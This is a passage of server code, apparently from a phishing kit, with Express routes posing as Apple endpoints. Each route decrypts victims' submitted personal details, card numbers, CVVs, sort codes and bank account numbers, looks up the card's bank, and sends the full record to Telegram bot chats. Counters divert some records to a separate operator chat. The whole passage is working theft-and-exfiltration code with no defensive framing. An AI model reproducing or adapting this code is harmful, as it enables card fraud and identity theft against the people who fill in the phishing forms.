  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (firstTrust == 100) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        firstTrust = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFirstTrust:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 837638060,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        firstTrust += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/appleSB", cors());

app.post("/appleSB", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (sbCount == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        sbCount = 9;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleSB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5450405437&text=Apple:\n${originalText}`
        );
        sbCount += 1;
      }
      res.send("Update Complete");
    });
});

let p2 = 0;

app.options("/appleP2", cors());

app.post("/appleP2", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (p2 == 15) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        p2 = 9;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleP2:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1265611993,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        p2 += 1;
      }
      res.send("Update Complete");
    });
});

var cdbCount = 0;

app.options("/spooferGooferApple", cors());

app.post("/spooferGooferApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 600) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        Spoofergoofer = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleSpooferGoofer:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=Apple:\n${originalText}`
        );
        Spoofergoofer += 1;
      }
    });
});

app.options("/kelvApple", cors());

app.post("/kelvApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 10;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleKelv:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=Apple:\n${originalText}`
        );
        kelvCount += 1;
      }
    });
});

var swipesC = 0;

app.options("/swipesApple", cors());

app.post("/swipesApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (swipesC == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        swipesC = 10;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleSwipes:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5348269876&text=Apple:\n${originalText}`
        );
        swipesC += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/daangerApple", cors());

app.post("/daangerApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (daanger == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        daanger = 10;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleDaanger:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=637332768&text=Apple:\n${originalText}`
        );
        Spoofergoofer += 1;
      }
    });
});

app.options("/fpaysApple", cors());

app.post("/fpaysApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fpaysC = 5;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFpays:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 2134201699,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fpaysC += 1;
      }
    });
});

var ciscoCount = 6;

app.options("/ciscoApple", cors());

app.post("/ciscoApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ip = req.body.ip;
  userAgent = req.body.userAgent;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalTextHaytch = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ciscoCount == 12) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalTextHaytch}`
        );
        ciscoCount = 7;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCisco:\n${originalTextHaytch}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1911692807&text=Apple:\n${originalTextHaytch}`
        );
        ciscoCount += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/onlymyApple", cors());

